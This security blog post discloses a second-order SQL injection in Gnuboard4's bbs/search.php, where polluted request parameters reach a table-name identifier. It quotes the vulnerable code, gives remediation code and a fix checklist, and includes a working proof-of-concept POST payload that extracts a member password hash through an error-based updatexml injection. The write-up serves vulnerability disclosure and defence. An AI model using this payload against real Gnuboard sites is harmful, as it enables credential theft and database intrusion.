---
title: Second-order SQL Injection via variable pollution of search_table (identifier injection) in bbs/search.php
url: https://darkless.cn/2025/09/16/gnuboard4-sqli/
source: darkless
date: 2025-09-17
fetch_date: 2025-10-02T20:14:40.104721
---

# Second-order SQL Injection via variable pollution of search_table (identifier injection) in bbs/search.php

[![](/images/logo1.svg)](/)
[darkless](/)

* [首页](/)
* [归档](/archives/)
* [标签](/tags/)
* [分类](/categories/)
* [文档](https://doc.darkless.cn/)
* [安全工具](https://darkless.notion.site/12832eebad358008894af8e247044d02)
* [留言](/contact/)

* [首页](/)
* [归档](/archives/)
* [标签](/tags/)
* [分类](/categories/)
* [文档](https://doc.darkless.cn/)
* [安全工具](https://darkless.notion.site/12832eebad358008894af8e247044d02)
* [留言](/contact/)

Second-order SQL Injection via variable pollution of search\_table (identifier injection) in bbs/search.php

![](https://cdn.jsdelivr.net/gh/handbye/images@master/uPic/2025/09/JocM2R.png)

![](/images/avatar.webp)

darkless

2025-09-16

2025-09-16

* [web安全](/categories/web%E5%AE%89%E5%85%A8/)
* [代码审计](/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
* [漏洞挖掘](/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/)

* [SQL注入](/tags/sql%E6%B3%A8%E5%85%A5/)
* [gnuboard4](/tags/gnuboard4/)

## Second-Order SQL Injection in Gnuboard4: Variable Pollution Meets Identifier Injection

When we talk about SQL injection, most folks picture a simple quote escape gone wrong in a value. But some of the most dangerous exploits happen in less obvious places—like identifiers (table names) and across multiple steps of request handling. In this post, we’ll walk through a second-order SQL injection in Gnuboard4’s `bbs/search.php` that’s enabled by variable pollution and executed as an identifier injection in the `FROM` clause.

### TL;DR

* The array `search_table` can be polluted via request parameters.
* Later, the polluted value is used as a table name without whitelist validation or quoting.
* This enables SQL injection in the identifier position, which typical escaping can’t fix.
* Impact: error-based and blind data exfiltration, JOIN injection, query truncation.

### Affected Code

The vulnerable usage occurs when composing the `FROM` clause from `$search_table[$idx]`:

|  |
| --- |
| ``` $tmp_write_table = $g4[write_prefix] . $search_table[$idx];  $sql = " select * from $tmp_write_table where $sql_search order by wr_id desc limit $from_record, $rows "; $result = sql_query($sql); ``` |

A similar pattern exists in the counting query:

|  |
| --- |
| ``` $tmp_write_table   = $g4[write_prefix] . $g4_search[tables][$i];  $sql = " select wr_id from $tmp_write_table where $sql_search "; ``` |

In legacy PHP stacks, request parameters are often extracted into same-named variables. That means an attacker can directly post `search_table[1]=...` and `table_index=1`, overwriting the server-side array and steering the subsequent query.

### Why This Is Second-Order Injection

* First order: the attacker “poisons” server state by overriding `search_table[]` and `table_index` via POST.
* Second order: the poisoned value is later treated as a table identifier in `FROM`, where normal string escaping is ineffective. Because the position is an identifier (not a quoted value), this allows injection of JOINs, ORDER BY, and even comment-based truncation.

### Proof of Concept (POST)

Replace `<host>` with your target host. To improve stability, replace `z2_0` with a board suffix that exists in your environment (e.g., `free`, `notice`) so `g4_write_<suffix>` actually exists.

|  |
| --- |
| ``` POST /gnuboard4/bbs/search.php HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded  srows=2&gr_id=test&sfl=wr_content&stx=123&sop=or&table_index=1&&search_table[0]=test&search_table[1]=z2_0+order%20by%20updatexml(1,concat(0x7e,(select%20mb_password%20from%20g4_member%20where%20mb_no=1),0x7e),1)# ``` |

What happens:

* `$tmp_write_table` becomes `g4_write_z2_0 order by updatexml(...)#`
* `#` comments out the rest of the query (`WHERE ... ORDER BY wr_id ... LIMIT ...`)
* `updatexml()` raises a controlled error embedding the subquery result—classic error-based exfiltration.

Even if error messages are suppressed, the same primitive can be adapted to time-based (blind) injection.

### Impact

* Exfiltration of sensitive data (e.g., credentials from `g4_member`) via error-based or blind SQLi.
* Injection of arbitrary JOINs to expand the result set and bypass intended filters.
* Query logic truncation by injecting comment markers.

### Root Causes

* Variable pollution: server trusts same-named request parameters to populate application variables/arrays.
* Identifier injection: unvalidated, unquoted table identifiers are constructed from user-controlled values.
* Lack of defense-in-depth on key control variables (`search_table`, `table_index`, etc.).

### Minimal, Practical Remediation

* Rebuild sensitive arrays before use to defeat pollution:

|  |
| --- |
| ``` // Prevent variable pollution: rebuild server-side state unset($search_table, $read_level, $table_index); $search_table = array(); $read_level = array(); $table_index = 0; ``` |

* Whitelist and quote identifiers; only allow `[A-Za-z0-9_]` within a bounded length, and wrap with backticks:

|  |
| --- |
| ``` // Identifier hardening: whitelist and quote $tbl = $g4_search[tables][$i]; if (!preg_match('/^\\w{1,30}$/', $tbl)) continue; $tmp_write_table = "`{$g4['write_prefix']}{$tbl}`"; ``` |

* Enforce integer types for indices/paging:

|  |
| --- |
| ``` $page = (int)$page ?: 1; $rows = (int)$srows ?: 10; $from_record = (int)$from_record; $table_index = isset($table_index) ? (int)$table_index : 0; ``` |

* Avoid `extract($_REQUEST)`style patterns entirely. If refactoring is not feasible, explicitly `unset` sensitive names from `$_REQUEST` before any extraction.

### Verification Checklist

* Before fix: observe SQL errors containing `updatexml` and `FROM g4_write_... order by ... #`.
* After fix: same PoC should neither alter the `FROM` clause nor leak data; `search_table[]` and `table_index` from the request must not influence server-side arrays.

### Closing Thoughts

Second-order bugs thrive in systems that mix legacy request handling with dynamic SQL generation. Any time a user-controlled value can shape identifiers or query structure—not just values—you need whitelists and strict rebuilding of server state. This case in Gnuboard4 is a compact example of how variable pollution escalates into full SQL injection at the identifier level.

—

If you maintain a similar stack, audit for:

* Any place identifiers are built from variables.
* Any global extraction of request parameters.
* Any “reusable” arrays rebuilt across requests without sanitization.

Second-order SQL Injection via variable pollution of search\_table (identifier injection) in bbs/search.php

/2025/09/16/gnuboard4-sqli/

作者

darkless

发布于

2025-09-16 08:00

许可

* [SQL注入](/tags/sql%E6%B3%A8%E5%85%A5/)
* [gnuboard4](/tags/gnuboard4/)

[完全由cursor开发的基于任务驱动的打点和扫描工具发布了
下一篇](/2025/7/30/tscan-tool/ "完全由cursor开发的基于任务驱动的打点和扫描工具发布了")

评论

评论插件加载失败
点击重新加载

正在加载评论插件

1. [Second-Order SQL Injection in Gnuboard4: Variable Pollution Meets Identifier Injection](#Second-Order-SQL-Injection-in-Gnuboard4-Variable-Pollution-Meets-Identifier-Injection)
   1. [TL;DR](#TL-DR)
   2. [Affected Code](#Affected-Code)
   3. [Why This Is Second-Order Injection](#Why-This-Is-Second-Order-Injection)
   4. [Proof of Concept (POST)](#Proof-of-Concept-POST)
   5. [Impact](#Impact)
   6. [Root Causes](#Root-Causes)
   7. [Minimal, Practical Remediation](#Minimal-Practical-Remediation)
   8. [Verification Checklist](#Verification-Checklist)
   9. [Closing Thoughts](#Closing-Thoughts)

© 2019 - 2025
   [darkless](/)

由 [Hexo](https://hexo.io) 驱动 & 主题 [Keep](https://github.com/XPoet/hexo-theme-keep)

![]()

1. [Second-Order SQL Injection in Gnuboard4: Variable Pollution Meets Identifier Injection](#Second-Order-SQL-Injection-in-Gnuboard4-Variable-Pollution-Meets-Identifier-Injection)
   1. [TL;DR](#TL-DR)
   2. [Affected Code](#Affected-Code)
   3. [Why This Is Second-Order Injection](#Why-This-Is-Second-Order-Injection)
   4. [Proof of Concept (POST)](#Proof-of-Concept-POST)
   5. [Impact](#Impact)
   6. ...